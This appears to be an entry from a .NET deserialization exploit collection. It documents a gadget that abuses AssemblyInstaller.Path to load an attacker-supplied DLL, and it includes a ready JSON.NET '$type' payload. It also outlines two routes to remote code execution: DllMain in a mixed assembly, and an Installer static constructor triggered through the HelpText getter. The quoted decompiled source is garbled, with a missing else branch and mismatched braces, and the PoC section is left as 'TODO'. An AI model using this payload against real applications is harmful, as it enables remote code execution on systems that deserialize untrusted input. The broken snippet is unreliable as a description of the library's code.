# Payload

```json
{"$type":"System.Configuration.Install.AssemblyInstaller,
System.Configuration.Install, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a",
"Path":"file:///c:/somePath/MixedLibrary.dll"}
```

# Source code

```csharp
// System.Configuration.Install.AssemblyInstaller
public void set_Path(string value)
{
        if (value == null)
        {
               this.assembly = null;
        this.assembly = Assembly.LoadFrom(value);
} }
```

# Attack vector

Execute payload on assembly load. There can be used 2 ways for RCE:

* We can put our code in DllMain() function of Mixed Assembly.  See [implications-of-loading-net-assemblies](https://blog.cylance.com/implications-of-loading-net-assemblies)
* We can put our code in static constructor of own Type derived from System.Configuration.Install.Installer and annotated as [RunInstallerAttribute(true)]. In this case we will need to call InitializeFromAssembly(). It can be done using the HelpText getter.  See [system.componentmodel.runinstallerattribute(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.componentmodel.runinstallerattribute(v=vs.110).aspx)

# Requirements

There is no additional requirement if assembly with payload is on the local machine but in case of remote resources, newer .Net Framework versions may have some additional security checks.

# PoC

TODO